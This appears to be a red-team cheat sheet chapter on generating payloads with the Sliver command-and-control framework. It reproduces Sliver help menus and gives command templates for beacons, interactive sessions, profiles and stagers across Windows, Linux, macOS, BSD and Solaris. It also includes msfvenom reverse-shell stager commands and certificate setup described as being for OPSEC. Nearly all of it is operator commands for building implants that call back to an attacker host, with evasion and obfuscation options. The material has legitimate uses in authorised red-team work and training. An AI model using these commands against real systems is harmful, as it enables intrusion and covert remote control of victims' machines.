# 04 - Generate Payloads

Search Tag(s): #sliver #command-and-control

## 4.1 - Beacons

### 4.1.1 - Help Menu

```
sliver > generate beacon -h

Generate a beacon binary

Usage:
======
  beacon [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -D, --days               int       beacon interval days (default: 0)
  -d, --debug                        enable debug features
  -G, --disable-sgn                  disable shikata ga nai shellcode encoder
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features  (e.g. overwrite user space hooks)
  -E, --external-builder             use an external builder
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -H, --hours              int       beacon interval hours (default: 0)
  -b, --http               string    http(s) connection strings
  -J, --jitter             int       beacon interval jitter in seconds (default: 30)
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -M, --minutes            int       beacon interval minutes (default: 0)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -s, --save               string    directory/file to the binary to
  -S, --seconds            int       beacon interval seconds (default: 60)
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -I, --template           string    implant code template (default: sliver)
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings
```

### 4.1.2 - Usage

#### 4.1.2.1 - Syntax

* Generate beacons

```
sliver > generate beacon -a <architecture> -l -S <seconds> -m <IP>:<PORT> -o <platform> -f <format> -s /path/to/folder

sliver > generate beacon -a <architecture> -l -S <seconds> -m <IP>:<PORT> -o <platform> -f <format> -s /path/to/folder

sliver > generate beacon -a <architecture> -l -S <seconds> -b http[s]://<IP>:<PORT> -o <platform> -f <format> -s /path/to/folder
```

#### 4.1.2.2 - Windows

* Initial Foothold beacon

`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory`

* Name-piped SMB beacon

`sliver > generate beacon -n <IP>//./pipe/<name_pipe> -a <[amd64 | x64] | [386 | x86] | arm | arm64> -o windows -f <exe | service | shared | shellcode> -s /path/to/directory`

#### 4.1.2.3 - Linux

`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | [386 | x86] | arm | arm64 | loong64 | mips | mips64 | mips64le | mipsle | ppc64 | ppc64le | riscv64 | s390x> -o linux -f <exe | shared | shellcode> -s /path/to/directory`

#### 4.1.2.4 - OSX

`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm64> -o darwin -f <exe | shared | shellcode> -s /path/to/directory`

#### 4.1.2.5 - BSD

* FreeBSD

`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o freebsd -f exe -s /path/to/directory`

* NetBSD

`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o netbsd -f exe -s /path/to/directory`

* OpenBSD

`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm64 | riscv64> -o openbsd -f exe -s /path/to/directory`

#### 4.1.2.6 - Solaris

`sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64]> -o solaris -f exe -s /path/to/directory`

### 4.1.3 - Profiles

#### 4.1.3.1 - Help Menu

```
sliver > profiles -h

List existing profiles

Usage:
======
  profiles [flags]

Flags:
======
  -h, --help           display help
  -t, --timeout int    command timeout in seconds (default: 60)

Sub Commands:
=============
  generate  Generate implant from a profile
  new       Create a new implant profile (interactive session)
  rm        Remove a profile

sliver > profiles new beacon -h

Create a new implant profile (beacon)

Usage:
======
  beacon [flags] [name]

Args:
=====
  name  string    name of the profile

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -D, --days               int       beacon interval days (default: 0)
  -d, --debug                        enable debug features
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -H, --hours              int       beacon interval hours (default: 0)
  -b, --http               string    http(s) connection strings
  -J, --jitter             int       beacon interval jitter in seconds (default: 30)
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -M, --minutes            int       beacon interval minutes (default: 0)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    implant name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -S, --seconds            int       beacon interval seconds (default: 60)
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings
```

#### 4.1.3.2 - Usage

* Syntax

```
sliver > profiles new beacon -m <IP>:<PORT> -S 5 -J 10 -l -a <architecture> -o <platform> -f <format> <profile_name>

sliver > profiles generate <profile>
```

## 4.2 - Sessions

### 4.2.1 - Help Menu

```
sliver > generate -h

Usage:
======
  generate [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -d, --debug                        enable debug features
  -G, --disable-sgn                  disable shikata ga nai shellcode encoder
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features (e.g. overwrite user space hooks)
  -E, --external-builder             use an external builder
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -b, --http               string    http(s) connection strings
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -s, --save               string    directory/file to the binary to
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -I, --template           string    implant code template (default: sliver)
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings


Sub Commands:
=============
  beacon  Generate a beacon binary
  info    Get information about the server's compiler
  stager  Generate a stager using Metasploit (requires local Metasploit installation)
```

### 4.2.2 - Usage

* Syntax

This beacon will be on interactive (session) mode

```
sliver > generate -m <IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/directory

sliver > generate -b http[s]://<IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/folder
```

### 4.2.3 - Profiles

#### 4.2.3.1 - Help Menu

```
sliver > profiles new -h

Command: new <options> <profile name>
About: Create a new profile with a given name and options, a name is required.

++ Profiles ++
Profiles are an easy way to save an implant configuration and easily generate multiple copies of the binary with the same
settings. Generated implants will still have per-binary certificates/obfuscation/etc. This command is used with "profiles generate":
        profiles new --mtls foo.example.com --canary 1.foobar.com my-profile-name
        profiles generate my-profile-name


Usage:
======
  new [flags] [name]

Args:
=====
  name  string    name of the profile

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -d, --debug                        enable debug features
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -b, --http               string    http(s) connection strings
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    implant name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings

Sub Commands:
=============
  beacon  Create a new implant profile (beacon)
```

#### 4.2.3.2 - Usage

* Windows

```
sliver > profiles new -m <IP>:<PORT> -l -a <architecture> -o <platform> -f <format> <profile_name>

sliver > profiles generate <profile_name>
```

## 4.3 - Stagers

### 4.3.1 - Help Menu

```
sliver > generate stager -h

Command: generate stager <options>
About: Generate a new sliver stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --format.

++ Bad Characters ++
Bad characters must be specified like this for single bytes:

generate stager -b 00

And like this for multiple bytes:

generate stager -b '00 0a cc'

++ Output Formats ++
You can use the --format flag to print out the shellcode to stdout, in one of the following transform formats:
bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript


Usage:
======
  stager [flags]

Flags:
======
  -a, --arch     string    cpu architecture (default: amd64)
  -b, --badchars string    bytes to exclude from stage shellcode
  -f, --format   string    Output format (msfvenom formats, see `help generate stager` for the list) (default: raw)
  -h, --help               display help
  -L, --lhost    string    Listening host
  -l, --lport    int       Listening port (default: 8443)
  -o, --os       string    operating system (default: windows)
  -r, --protocol string    Staging protocol (tcp/http/https) (default: tcp)
  -s, --save     string    directory to save the generated stager to
  -t, --timeout  int       command timeout in seconds (default: 60)

sliver > stage-listener -h

Command: stage-listener <options>
About: Starts a stager listener bound to a Sliver profile.
Examples: 

The following command will start a TCP listener on 1.2.3.4:8080, and link the my-sliver-profile profile to it.
When a stager calls back to this URL, a sliver corresponding to the said profile will be sent.

stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile

To create a profile, use the profiles new command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:

profiles new --format shellcode --mtls 1.2.3.4 --skip-symbols windows-shellcode


Usage:
======
  stage-listener [flags]

Flags:
======
      --aes-encrypt-iv  string    encrypt stage with AES encryption iv
      --aes-encrypt-key string    encrypt stage with AES encryption key
  -c, --cert            string    path to PEM encoded certificate file (HTTPS only)
  -C, --compress        string    compress the stage before encrypting (zlib, gzip, deflate9, none) (default: none)
  -h, --help                      display help
  -k, --key             string    path to PEM encoded private key file (HTTPS only)
  -e, --lets-encrypt              attempt to provision a let's encrypt certificate (HTTPS only)
  -P, --prepend-size              prepend the size of the stage to the payload (to use with MSF stagers)
  -p, --profile         string    implant profile name to link with the listener
  -u, --url             string    URL to which the stager will call back to
```

### 4.3.2 - Usage

#### 4.3.2.1 - Syntax

* Note: Any listener will work the only detail you should pay attention on the `stage-listener` sliver command

```
sliver > mtls -L <IP> -l 4488

sliver > profiles new [beacon] [-S 5] [-J 10] -m <IP>:4488 -l -a x64 -o windows -f shellcode stager-shellcode

sliver > stage-listener -u <scheme>://<IP>:8080 -p stager-shellcode

sliver > generate stager -L <IP> -l <PORT> -r <tcp | http | https> -a <x64 | x86> -o <windows | linux | osx> -f <format> -s /path/to/shellcode
```

#### 4.3.2.2 - TCP

```
sliver > mtls -L <IP> -l 4488

sliver > profiles new -m <IP>:4488 -l -a x64 -o windows -f shellcode stager-shellcode

sliver > stage-listener -u tcp://<IP>:8080 -p stager-shellcode

sliver > generate stager -r tcp -L <IP> -l 8080 -a x64 -o windows -f raw -s staged-sliver.bin
```

* Or you can generate it with `msfvenom`

`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=8080 -f raw -o staged-sliver.bin`

#### 4.3.2.3 - HTTP

Note: `-P` or `--prepend-size` treats the first four bytes as instructions that your shellcode loader may not took this into account. It uses `msfvenom` to generate shellcode for you if it's installed on your system.

```
sliver > https -L <IP> -l 4488

sliver > profiles new beacon -b https://<IP>:4488 -S 5 -J 10 -l -a x64 -o windows -f shellcode stager-shellcode

sliver > stage-listener -u http://<IP>:8080 [-P] -p stager-shellcode

sliver > generate stager -r http -L <IP> -l 8080 -a x64 -o windows -f raw -s sliver-http-stager.bin
```

* Or you can generate it with `msfvenom`

`$ msfvenom -p windows/x64/custom/reverse_winhttp lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-http-stager.bin`

#### 4.3.2.4 - HTTPS

1. Use custom TLS key and certificate (this is optional but recommended for OPSEC)

* Encrypted TLS key and certification

```
$ openssl req -x509 -newkey rsa:4096 -keyout keyfile.pem -out certificate.pem -sha256 -days 365

$ openssl x509 -in certificate.pem -text -noout

$ openssl rsa -in keyfile.pem -check > key.pem
```

* Non-encrypted TLS key and certification

```
$ openssl req -new -x509 -keyout key.pem -out certificate.pem -days 365 -nodes

sliver > mtls -L <IP> -l 4488

sliver > profiles new -m <IP>:4488 -l -a x64 -o windows -f shellcode stager-shellcode

sliver > stage-listener -u https://<IP>:8080 -C <zlib | gzip | deflate9> -c /path/to/certificate.pem -k /path/to/key.pem [-P] -p stager-shellcode

sliver > generate stager -r https -L <IP> -l 8080 -a x64 -o windows -f raw -s sliver-https-stager.bin
```

Or you can generate it with `msfvenom`

`$ msfvenom -p windows/x64/custom/reverse_winhttps lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-https-stager.bin`

## 4.4 - Implants

### 4.4.1 - Help Menu

```
sliver > implants -h

List implant builds

Usage:
======
  implants [flags]

Flags:
======
  -a, --arch          string    filter builds by cpu architecture
  -f, --format        string    filter builds by artifact format
  -h, --help                    display help
  -d, --no-debug                filter builds by debug flag
  -b, --only-beacons            filter beacons
  -s, --only-sessions           filter interactive sessions
  -o, --os            string    filter builds by operating system
  -t, --timeout       int       command timeout in seconds (default: 60)

Sub Commands:
=============
  rm  Remove implant build
```

### 4.4.2 - Usage

* List the implant names

`sliver > implants`

* Remove implants

`sliver > implants rm <implant_name>`

* Regenerate implants

`sliver > regenerate <implant_name>`